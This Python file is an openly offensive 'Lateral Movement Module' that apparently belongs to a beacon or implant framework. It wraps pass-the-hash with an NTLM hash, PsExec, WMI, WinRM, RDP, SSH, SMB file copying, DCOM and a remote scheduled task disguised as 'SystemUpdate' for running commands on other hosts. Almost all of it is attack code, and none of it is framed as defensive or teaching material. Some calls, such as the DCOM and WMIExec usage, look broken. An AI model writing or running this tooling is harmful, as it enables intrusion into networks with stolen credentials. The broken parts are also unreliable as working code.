#!/usr/bin/env python3
"""
Lateral Movement Module
Features: Pass-the-Hash, RDP, WMI, WinRM, SSH, SMB, PsExec
"""

import subprocess
import socket
import json
import time
import base64
from typing import Optional, Dict, List
import os
import sys

class LateralMovement:
    """Lateral movement techniques"""
    
    def __init__(self, beacon_agent):
        self.agent = beacon_agent
        self.credentials = {}
        self.targets = []
    
    def pass_the_hash(self, target: str, username: str, ntlm_hash: str, 
                     domain: str = ".") -> Dict:
        """Pass-the-Hash attack using Mimikatz/Impacket"""
        try:
            # Use Impacket's psExec with NTLM hash
            cmd = [
                "psexec",
                f"{domain}/{username}@{target}",
                "-hashes",
                f":{ntlm_hash}",
                "cmd.exe",
                "/c",
                f"echo {self.agent.beacon_id} > C:\\Users\\Public\\beacon.txt"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def wmi_exec(self, target: str, username: str, password: str, 
                 command: str) -> Dict:
        """WMI execution on remote host"""
        try:
            import impacket
            from impacket.wmiexec import WMIExec
            
            wmi = WMIExec(
                target,
                username=username,
                password=password
            )
            
            result = wmi.run(command)
            return {'success': True, 'output': result}
        except:
            # Fallback using wmic
            cmd = [
                "wmic",
                "/node:",
                target,
                "/user:",
                username,
                "/password:",
                password,
                "process",
                "call",
                "create",
                f'"{command}"'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            return {'success': result.returncode == 0, 'output': result.stdout}
    
    def winrm_session(self, target: str, username: str, password: str) -> Dict:
        """WinRM session establishment"""
        try:
            import winrm
            
            session = winrm.Session(
                target,
                auth=(username, password),
                transport='ntlm'
            )
            
            # Test connection
            result = session.run_cmd('whoami')
            
            return {
                'success': True,
                'session': session,
                'output': result.std_out.decode()
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def rdp_session(self, target: str, username: str, password: str) -> Dict:
        """RDP session establishment"""
        try:
            # Using xfreerdp or rdesktop
            cmd = [
                "xfreerdp",
                f"/v:{target}",
                f"/u:{username}",
                f"/p:{password}",
                "/cert-ignore",
                "/security:any"
            ]
            
            # Launch RDP in background
            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            return {'success': True, 'message': f'RDP session started to {target}'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def ssh_session(self, target: str, username: str, password: str, 
                    command: str = "whoami") -> Dict:
        """SSH session to remote host"""
        try:
            import paramiko
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password)
            
            stdin, stdout, stderr = ssh.exec_command(command)
            output = stdout.read().decode()
            
            ssh.close()
            
            return {'success': True, 'output': output}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def smb_move(self, target: str, share: str, file_path: str, 
                 username: str = "", password: str = "") -> Dict:
        """SMB lateral movement"""
        try:
            import smbclient
            from smbclient import register_session, ls, copyfile
            
            if username and password:
                register_session(target, username=username, password=password)
            
            # Copy file to SMB share
            dest_path = f"\\\\{target}\\{share}\\{os.path.basename(file_path)}"
            copyfile(file_path, dest_path)
            
            return {'success': True, 'message': f'File copied to {dest_path}'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def psexec(self, target: str, username: str, password: str, 
               command: str) -> Dict:
        """PsExec execution on remote host"""
        try:
            cmd = [
                "psexec",
                f"\\\\{target}",
                "-u",
                username,
                "-p",
                password,
                "cmd.exe",
                "/c",
                command
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            return {'success': result.returncode == 0, 'output': result.stdout}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def dcom_exec(self, target: str, username: str, password: str, 
                  command: str) -> Dict:
        """DCOM remote execution"""
        try:
            import pywintypes
            import win32com.client
            
            # DCOM object
            dcom = win32com.client.Dispatch("WScript.Shell")
            dcom.ConnectServer(target, username=username, password=password)
            
            result = dcom.Exec(command)
            
            return {'success': True, 'output': result}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def scheduled_task(self, target: str, username: str, password: str,
                       command: str, task_name: str = "SystemUpdate") -> Dict:
        """Create scheduled task on remote host"""
        try:
            cmd = [
                "schtasks",
                "/create",
                "/s",
                target,
                "/u",
                username,
                "/p",
                password,
                "/tn",
                task_name,
                "/tr",
                command,
                "/sc",
                "once",
                "/st",
                "00:00"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            return {'success': result.returncode == 0, 'output': result.stdout}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def execute_enumeration(self, target: str, method: str = "smb") -> Dict:
        """Execute lateral movement enumeration"""
        results = {}
        
        # Check if target is reachable
        try:
            socket.gethostbyname(target)
            results['reachable'] = True
        except:
            results['reachable'] = False
            return results
        
        # Enumerate based on method
        if method == "smb":
            # Check SMB availability
            try:
                import smbclient
                shares = smbclient.ls(f"\\\\{target}")
                results['shares'] = shares
            except:
                pass
        
        elif method == "wmi":
            # Check WMI availability
            try:
                import wmi
                c = wmi.WMI(target)
                results['wmi_available'] = True
            except:
                results['wmi_available'] = False
        
        elif method == "winrm":
            # Check WinRM availability
            try:
                import winrm
                session = winrm.Session(target, auth=('', ''), transport='ntlm')
                results['winrm_available'] = True
            except:
                results['winrm_available'] = False
        
        return results
